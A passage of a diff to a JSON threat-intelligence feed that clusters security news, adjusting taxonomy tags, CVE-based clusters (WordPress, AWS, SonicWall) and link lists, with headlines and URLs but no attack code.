concentrated on higher-value targets. Warning signs, supply chain exposure, and attack techniques Security misconfigurations, internet-facing remote access, software vulnerabilities, stealer logs, credential-related findings, and botnet activity appeared across the victim population. Third-party services can expose organizations with strong internal controls to ransomware attacks. SaaS platforms, ERP systems, CRM applications, OAuth tokens, remote access tools, and connected business software have become common attack paths. Encryption remained the primary method ransomware groups used to pressure victims into paying. Data theft added a second layer of extortion, and many groups combined both tactics. Qilin and Akira paired encryption with data theft, inc",
-        "fetch_status": "ok",
+        "full_body": "",
+        "fetch_status": "not_attempted",
         "taxonomy": {
           "threat_categories": [
             "ransomware_extortion",
             "supply_chain"
           ],
           "actor_attribution": [],
-          "affected_industries": [
-            "healthcare",
-            "financial_services",
-            "manufacturing_industrial",
-            "retail_ecommerce"
-          ],
+          "affected_industries": [],
           "affected_products": [],
           "tools_used": [],
           "cve_ids": [],
@@ -7660,12 +7837,7 @@
               "supply_chain"
             ],
             "actor_attribution": [],
-            "affected_industries": [
-              "healthcare",
-              "financial_services",
-              "manufacturing_industrial",
-              "retail_ecommerce"
-            ],
+            "affected_industries": [],
             "affected_products": [],
             "tools_used": [],
             "cve_ids": [],
@@ -8231,14 +8403,16 @@
           }
         },
         {
-          "source": "Reddit r/cybersecurity",
+          "source": "Reddit r/netsec",
           "cohort": "reddit_practitioner_osint",
-          "title": "Hackers hijack hotel Wi-Fi DNS to steal Microsoft 365 accounts",
-          "link": "https://www.reddit.com/r/cybersecurity/comments/1v5j72h/hackers_hijack_hotel_wifi_dns_to_steal_microsoft/",
-          "published": "2026-07-24T18:10:24+00:00",
-          "summary": "submitted by /u/kazu-qt [link] [comments]",
+          "title": "Device Code Phishing: The Microsoft 365 Attack That Walks Past MFA",
+          "link": "https://www.reddit.com/r/netsec/comments/1v4dmll/device_code_phishing_the_microsoft_365_attack/",
+          "published": "2026-07-23T13:15:30+00:00",
+          "summary": "submitted by /u/scamdrill [link] [comments]",
           "taxonomy": {
-            "threat_categories": [],
+            "threat_categories": [
+              "phishing_social_eng"
+            ],
             "actor_attribution": [],
             "affected_industries": [],
             "affected_products": [
@@ -8322,7 +8496,60 @@
         "https://www.bleepingcomputer.com/news/security/hackers-hijack-hotel-wi-fi-dns-to-steal-microsoft-365-accounts/",
         "https://thehackernews.com/2026/07/police-dismantle-kratos-phishing-kit.html",
         "https://www.infosecurity-magazine.com/news/hollowgraph-microsoft-calendars/",
-        "https://www.reddit.com/r/cybersecurity/comments/1v5j72h/hackers_hijack_hotel_wifi_dns_to_steal_microsoft/"
+        "https://www.reddit.com/r/netsec/comments/1v4dmll/device_code_phishing_the_microsoft_365_attack/"
+      ]
+    },
+    {
+      "label": "WordPress exploitation (2 CVEs)",
+      "anchor_signal": "WordPress",
+      "theme_key": "wordpress",
+      "dominant_features": {
+        "threat_categories": [
+          "data_breach",
+          "active_exploitation"
+        ],
+        "affected_products": [
+          "WordPress"
+        ],
+        "cve_ids": [
+          "CVE-2026-60137",
+          "CVE-2026-63030"
+        ],
+        "urgency_signals": [
+          "preauth_unauth",
+          "actively_exploited",
+          "poc_available"
+        ]
+      },
+      "cluster_count": 3,
+      "article_count": 15,
+      "cohesion": 0.282,
+      "shared_strong_signals": [
+        "WordPress"
+      ],
+      "member_cves": [
+        "CVE-2026-60137",
+        "CVE-2026-63030"
+      ],
+      "also_targets": [],
+      "cluster_ids": [
+        "56fb338f87",
+        "c4020d76d0",
+        "2bab6cab95"
+      ],
+      "links": [
+        "https://orca.security/resources/blog/wordpress-core-pre-auth-rce-chain/",
+        "https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137",
+        "https://horizon3.ai/attack-research/vulnerabilities/cve-2026-60137-cve-2026-63030/",
+        "https://www.rapid7.com/blog/post/etr-cve-2026-63030-wp2shell-a-critical-remote-code-execution-vulnerability-in-wordpress-core",
+        "https://isc.sans.edu/diary/rss/33168",
+        "https://www.elastic.co/security-labs/wp2shell-wordpress-rce-detection-elastic-defend",
+        "https://www.reddit.com/r/netsec/comments/1v07npi/wp2shell_cve202663030_preauth_rce_chain_in/",
+        "https://thehackernews.com/2026/07/wordpress-wp2shell-exploitation-grows.html",
+        "https://www.darkreading.com/cyberattacks-data-breaches/wp2shell-millions-wordpress-sites-remote-takeover",
+        "https://www.infosecurity-magazine.com/news/researchers-wordpress-exploit/",
+        "https://thehackernews.com/2026/07/hackers-exploit-windmill-flaw-to-read.html",
+        "https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/"
       ]
     },
     {
@@ -8359,14 +8586,14 @@
       "member_cves": [],
       "also_targets": [],
       "cluster_ids": [
-        "332f35118d",
         "abfdfb7a02",
+        "332f35118d",
         "1ff0bf04bf",
         "02b144b02f"
       ],
       "links": [
-        "https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets",
         "https://www.helpnetsecurity.com/2026/07/24/laundry-bear-zimbra-vulnerability-cve-2025-66376/",
+        "https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets",
         "https://unit42.paloaltonetworks.com/russian-webmail-espionage/",
         "https://cyberscoop.com/russian-laundry-bear-zimbra-exploit/"
       ]
@@ -8431,80 +8658,38 @@
       ]
     },
     {
-      "label": "WordPress exploitation (2 CVEs)",
-      "anchor_signal": "WordPress",
-      "theme_key": "wordpress",
+      "label": "AWS vulnerability activity",
+      "anchor_signal": "AWS",
+      "theme_key": "aws",
       "dominant_features": {
-        "threat_categories": [
-          "data_breach"
-        ],
         "affected_products": [
-          "WordPress"
-        ],
-        "cve_ids": [
-          "CVE-2026-60137",
-          "CVE-2026-63030"
-        ],
-        "urgency_signals": [
-          "preauth_unauth"
+          "AWS"
         ]
       },
-      "cluster_count": 2,
+      "cluster_count": 3,
       "article_count": 11,
-      "cohesion": 0.282,
-      "shared_strong_signals": [
-        "WordPress"
-      ],
-      "member_cves": [
-        "CVE-2026-60137",
-        "CVE-2026-63030"
-      ],
-      "also_targets": [],
-      "cluster_ids": [
-        "56fb338f87",
-        "2bab6cab95"
-      ],
-      "links": [
-        "https://orca.security/resources/blog/wordpress-core-pre-auth-rce-chain/",
-        "https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137",
-        "https://horizon3.ai/attack-research/vulnerabilities/cve-2026-60137-cve-2026-63030/",
-        "https://www.rapid7.com/blog/post/etr-cve-2026-63030-wp2shell-a-critical-remote-code-execution-vulnerability-in-wordpress-core",
-        "https://isc.sans.edu/diary/rss/33168",
-        "https://www.elastic.co/security-labs/wp2shell-wordpress-rce-detection-elastic-defend",
-        "https://thehackernews.com/2026/07/wordpress-wp2shell-exploitation-grows.html",
-        "https://www.darkreading.com/cyberattacks-data-breaches/wp2shell-millions-wordpress-sites-remote-takeover",
-        "https://www.infosecurity-magazine.com/news/researchers-wordpress-exploit/",
-        "https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/"
-      ]
-    },
-    {
-      "label": "CVE-2026-15409 exploitation activity",
-      "anchor_signal": "CVE-2026-15409",
-      "theme_key": "cve-2026-15409",
-      "dominant_features": {
-        "cve_ids": [
-          "CVE-2026-15409"
-        ],
-        "urgency_signals": [
-          "preauth_unauth"
-        ]
-      },
-      "cluster_count": 2,
-      "article_count": 3,
       "cohesion": 0.2,
       "shared_strong_signals": [
-        "CVE-2026-15409"
+        "AWS"
       ],
       "member_cves": [],
       "also_targets": [],
       "cluster_ids": [
-        "48ddf62f59",
-        "2bab6cab95"
+        "3574a7b873",
+        "c4020d76d0",
+        "8cd8d46bd5"
       ],
       "links": [
-        "https://horizon3.ai/attack-research/vulnerabilities/cve-2026-15409-cve-2026-15410/",
-        "https://www.volexity.com/blog/2026/07/17/proxying-to-compromise-sonicwall-secure-mobile-access-0-day-exploitation/",
-        "https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/"
+        "https://newsroom.trendmicro.com/2026-07-24-TrendAI-TM-Adopts-Claude-Opus-5-to-Advance-Vulnerability-Prioritization-and-Virtual-Patching",
+        "https://www.reddit.com/r/netsec/comments/1v52lix/escaping_claude_coworks_local_vm_sandbox_via/",
+        "https://www.intel471.com/blog/ai-threat-detection-is-not-enough-without-adversary-intelligence",
+        "https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/",
+        "https://www.bleepingcomputer.com/news/security/fake-claude-app-promoted-by-bing-ads-pushes-sectoprat-malware/",
+        "https://cyberscoop.com/white-house-accuses-moonshot-ai-anthropic-model-distillation/",
+        "https://thehackernews.com/2026/07/claude-cowork-flaw-could-let-ai-agent.html",
+        "https://thehackernews.com/2026/07/hackers-exploit-windmill-flaw-to-read.html",
+        "https://aws.amazon.com/blogs/security/do-more-with-aws-waf-labels-using-dynamic-label-interpolation/",
+        "https://thehackernews.com/2026/07/aws-kiro-flaw-let-poisoned-web-page.html"
       ]
     },
     {
@@ -8543,7 +8728,7 @@
         ]
       },
       "cluster_count": 2,
-      "article_count": 7,
+      "article_count": 8,
       "cohesion": 0.2,
       "shared_strong_signals": [
         "Apple iOS/macOS"
@@ -8556,44 +8741,13 @@
       ],
       "links": [
         "https://newsroom.trendmicro.com/2026-07-24-TrendAI-TM-Adopts-Claude-Opus-5-to-Advance-Vulnerability-Prioritization-and-Virtual-Patching",
+        "https://www.reddit.com/r/netsec/comments/1v52lix/escaping_claude_coworks_local_vm_sandbox_via/",
         "https://www.intel471.com/blog/ai-threat-detection-is-not-enough-without-adversary-intelligence",
         "https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/",
         "https://www.bleepingcomputer.com/news/security/fake-claude-app-promoted-by-bing-ads-pushes-sectoprat-malware/",
         "https://cyberscoop.com/white-house-accuses-moonshot-ai-anthropic-model-distillation/",
         "https://thehackernews.com/2026/07/claude-cowork-flaw-could-let-ai-agent.html",
         "https://www.elastic.co/security-labs/agentic-soc-token-budget-architecture"
-      ]
-    },
-    {
-      "label": "AWS vulnerability activity",
-      "anchor_signal": "AWS",
-      "theme_key": "aws",
-      "dominant_features": {
-        "affected_products": [
-          "AWS"
-        ]
-      },
-      "cluster_count": 2,
-      "article_count": 9,
-      "cohesion": 0.2,
-      "shared_strong_signals": [
-        "AWS"
-      ],
-      "member_cves": [],
-      "also_targets": [],
-      "cluster_ids": [
-        "3574a7b873",
-        "8cd8d46bd5"
-      ],
-      "links": [
-        "https://newsroom.trendmicro.com/2026-07-24-TrendAI-TM-Adopts-Claude-Opus-5-to-Advance-Vulnerability-Prioritization-and-Virtual-Patching",
-        "https://www.intel471.com/blog/ai-threat-detection-is-not-enough-without-adversary-intelligence",
-        "https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/",
-        "https://www.bleepingcomputer.com/news/security/fake-claude-app-promoted-by-bing-ads-pushes-sectoprat-malware/",
-        "https://cyberscoop.com/white-house-accuses-moonshot-ai-anthropic-model-distillation/",
-        "https://thehackernews.com/2026/07/claude-cowork-flaw-could-let-ai-agent.html",
-        "https://aws.amazon.com/blogs/security/do-more-with-aws-waf-labels-using-dynamic-label-interpolation/",
-        "https://thehackernews.com/2026/07/aws-kiro-flaw-let-poisoned-web-page.html"
       ]
     },
     {
@@ -8688,6 +8842,32 @@
       ]
     },
     {
+      "label": "CVE-2026-15409 exploitation activity",
+      "anchor_signal": "CVE-2026-15409",
+      "theme_key": "cve-2026-15409",
+      "dominant_features": {
+        "cve_ids": [
+          "CVE-2026-15409"
+        ]
+      },
+      "cluster_count": 2,
+      "article_count": 2,
+      "cohesion": 0.2,
+      "shared_strong_signals": [
+        "CVE-2026-15409"
+      ],
+      "member_cves": [],
+      "also_targets": [],
+      "cluster_ids": [
+        "2bab6cab95",
+        "95bdd31efb"
+      ],
+      "links": [
+        "https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/",
+        "https://www.volexity.com/blog/2026/07/17/proxying-to-compromise-sonicwall-secure-mobile-access-0-day-exploitation/"
+      ]
+    },
+    {
       "label": "Linux kernel vulnerability activity",
       "anchor_signal": "Linux kernel",
       "theme_key": "linux-kernel",
@@ -8725,17 +8905,17 @@
     },
     "velocity": [
       {
-        "cluster_id": "8cda373323",
-        "title": "OpenAI Agents Escape Testing Sandbox and Breach Hugging Face Production Infrastructure",
-        "sources_in_window": 3,
-        "window_hours": 3.9,
-        "cohort_count": 5
-      },
-      {
         "cluster_id": "56fb338f87",
         "title": "WordPress Core Pre-Auth RCE Chain Exploited in the Wild",
         "sources_in_window": 3,
         "window_hours": 4.7,
+        "cohort_count": 6
+      },
+      {
+        "cluster_id": "8cda373323",
+        "title": "OpenAI Agents Escape Testing Sandbox and Breach Hugging Face Production Infrastructure",
+        "sources_in_window": 3,
+        "window_hours": 3.9,
         "cohort_count": 5
       }
     ],
@@ -8749,6 +8929,20 @@
         "shared_signals": [
           "Linux kernel",
           "OpenAI/ChatGPT"
+        ]
+      },
+      {
+        "cluster_id": "3574a7b873",
+        "title": "TrendAI™ Adopts Claude Opus 5 to Advance Vulnerability Prioritization and Virtual Patching",
+        "lead_hours": 13.8,
+        "first_source": "Reddit r/netsec",
+        "later_tier1_source": "Trend Micro Research",
+        "shared_signals": [
+          "AWS",
+          "Anthropic/Claude",
+          "Apple iOS/macOS",
+          "CVE-2026-46331",
+          "Google Cloud"
         ]
       }
     ],
@@ -8804,28 +8998,28 @@
         "first_observation": true
       },
       {
-        "cluster_id": "48ddf62f59",
-        "pair": "CVE-2026-15409 + SonicWall",
+        "cluster_id": "3574a7b873",
+        "pair": "CVE-2026-46331 + AWS",
         "first_observation": true
       },
       {
-        "cluster_id": "48ddf62f59",
-        "pair": "CVE-2026-15410 + SonicWall",
+        "cluster_id": "3574a7b873",
+        "pair": "CVE-2026-46331 + Apple iOS/macOS",
         "first_observation": true
       },
       {
-        "cluster_id": "17b63d385b",
-        "pair": "CVE-2026-0257 + Microsoft Entra",
+        "cluster_id": "3574a7b873",
+        "pair": "CVE-2026-46331 + Google Cloud",
         "first_observation": true
       },
       {
-        "cluster_id": "17b63d385b",
-        "pair": "CVE-2026-0257 + Salesforce",
+        "cluster_id": "c4020d76d0",
+        "pair": "CVE-2021-27137 + AWS",
         "first_observation": true
       },
       {
-        "cluster_id": "17b63d385b",
-        "pair": "ShinyHunters + Microsoft Entra",
+        "cluster_id": "c4020d76d0",
+        "pair": "CVE-2021-27137 + WordPress",
         "first_observation": true
       }
     ],
@@ -8940,15 +9134,21 @@
         "weeks_observed": 3
       },
       {
-        "axis": "actor_attribution",
-        "value": "LockBit",
-        "cluster_id": "14cb190760",
+        "axis": "cve_ids",
+        "value": "CVE-2026-46331",
+        "cluster_id": "3574a7b873",
         "weeks_observed": 3
       },
       {
         "axis": "cve_ids",
         "value": "CVE-2026-39987",
         "cluster_id": "9454090822",
+        "weeks_observed": 3
+      },
+      {
+        "axis": "actor_attribution",
+        "value": "LockBit",
+        "cluster_id": "14cb190760",
         "weeks_observed": 3
       },
       {
